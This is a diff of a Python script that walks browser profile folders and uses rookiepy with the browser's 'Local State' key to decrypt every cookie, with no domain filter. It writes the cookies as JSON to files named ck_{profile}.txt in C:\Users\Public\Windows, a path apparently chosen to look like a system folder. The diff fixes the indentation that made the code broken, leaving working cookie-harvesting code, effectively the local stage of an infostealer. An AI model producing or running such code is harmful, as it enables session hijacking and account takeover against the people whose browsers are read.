@@ -44,6 +44,7 @@ def detect_folders(base_dir):
         if os.path.isdir(folder_path) and is_eligible_folder(folder_path, folder_name):
             detected_folders.append(folder_name)
     return detected_folders
+
 def main():
     detected_folders = detect_folders(BASE_DIR)
     for profile in detected_folders:
@@ -52,12 +53,11 @@ def main():
         print(db_path)
         key_path = Path(BASE_DIR) / "Local State"
         print(key_path)
-            cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
+        cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
         output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
         with open(output_file, "w") as file:
             json.dump(cookies, file, indent=4)
         print(f"Cookies written to {output_file}")
-
 
 if __name__ == "__main__":
     main()
